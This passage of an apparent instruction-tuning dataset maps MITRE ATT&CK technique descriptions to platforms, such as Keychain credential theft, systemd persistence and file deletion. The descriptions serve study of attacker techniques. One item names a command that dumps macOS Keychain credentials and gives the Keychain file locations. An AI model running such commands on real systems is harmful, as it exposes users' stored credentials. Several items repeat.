    "instruction": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.",
    "context": "",
    "output": "The provided description is related to MITRE technique Valid Accounts (T1078);\nTechnique Valid Accounts (T1078) is applicable to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.",
      "answer": "The provided description is related to MITRE technique Valid Accounts (T1078);\nTechnique Valid Accounts (T1078) is applicable to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Encoding: Standard Encoding (T1132.001);\nTechnique Data Encoding: Standard Encoding (T1132.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.",
      "answer": "The provided description is related to MITRE technique Data Encoding: Standard Encoding (T1132.001);\nTechnique Data Encoding: Standard Encoding (T1132.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading (T1036);\nTechnique Masquerading (T1036) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading.",
      "answer": "The provided description is related to MITRE technique Masquerading (T1036);\nTechnique Masquerading (T1036) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Phishing: Spearphishing Attachment (T1566.001);\nTechnique Phishing: Spearphishing Attachment (T1566.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
      "answer": "The provided description is related to MITRE technique Phishing: Spearphishing Attachment (T1566.001);\nTechnique Phishing: Spearphishing Attachment (T1566.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Web Service: Bidirectional Communication (T1102.002);\nTechnique Web Service: Bidirectional Communication (T1102.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
      "answer": "The provided description is related to MITRE technique Web Service: Bidirectional Communication (T1102.002);\nTechnique Web Service: Bidirectional Communication (T1102.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`). \n\nInside the `.service` unit files, the following directives are used to execute commands:  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start.\n* `ExecReload` directive executes when a service restarts. \n* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a `.service` file\u2019s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem. \n\nThe .service file\u2019s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions.",
    "context": "",
    "output": "The provided description is related to MITRE technique Create or Modify System Process: Systemd Service (T1543.002);\nTechnique Create or Modify System Process: Systemd Service (T1543.002) is applicable to platforms: Linux;\nTherefore, the given procedure description is related to platforms: Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit configuration files with the `.service` file extension to encode information about a service's process. By default, system level unit files are stored in the `/systemd/system` directory of the root owned directories (`/`). User level unit files are stored in the `/systemd/user` directories of the user owned directories (`$HOME`). \n\nInside the `.service` unit files, the following directives are used to execute commands:  \n\n* `ExecStart`, `ExecStartPre`, and `ExecStartPost` directives execute when a service is started manually by `systemctl` or on system start if the service is set to automatically start.\n* `ExecReload` directive executes when a service restarts. \n* `ExecStop`, `ExecStopPre`, and `ExecStopPost` directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a `.service` file\u2019s directive executes, and modified the user directive a `.service` file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem. \n\nThe .service file\u2019s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions.",
      "answer": "The provided description is related to MITRE technique Create or Modify System Process: Systemd Service (T1543.002);\nTechnique Create or Modify System Process: Systemd Service (T1543.002) is applicable to platforms: Linux;\nTherefore, the given procedure description is related to platforms: Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
    "context": "",
    "output": "The provided description is related to MITRE technique Obtain Capabilities: Malware (T1588.001);\nTechnique Obtain Capabilities: Malware (T1588.001) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
      "answer": "The provided description is related to MITRE technique Obtain Capabilities: Malware (T1588.001);\nTechnique Obtain Capabilities: Malware (T1588.001) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading (T1036);\nTechnique Masquerading (T1036) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading.",
      "answer": "The provided description is related to MITRE technique Masquerading (T1036);\nTechnique Masquerading (T1036) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the Net utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
    "context": "",
    "output": "The provided description is related to MITRE technique Permission Groups Discovery: Local Groups (T1069.001);\nTechnique Permission Groups Discovery: Local Groups (T1069.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n\nCommands such as <code>net localgroup</code> of the Net utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.",
      "answer": "The provided description is related to MITRE technique Permission Groups Discovery: Local Groups (T1069.001);\nTechnique Permission Groups Discovery: Local Groups (T1069.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.",
    "context": "",
    "output": "The provided description is related to MITRE technique Account Manipulation (T1098);\nTechnique Account Manipulation (T1098) is applicable to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.",
      "answer": "The provided description is related to MITRE technique Account Manipulation (T1098);\nTechnique Account Manipulation (T1098) is applicable to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.",
    "context": "",
    "output": "The provided description is related to MITRE technique Credentials from Password Stores: Keychain (T1555.001);\nTechnique Credentials from Password Stores: Keychain (T1555.001) is applicable to platforms: macOS;\nTherefore, the given procedure description is related to platforms: macOS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.",
      "answer": "The provided description is related to MITRE technique Credentials from Password Stores: Keychain (T1555.001);\nTechnique Credentials from Password Stores: Keychain (T1555.001) is applicable to platforms: macOS;\nTherefore, the given procedure description is related to platforms: macOS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
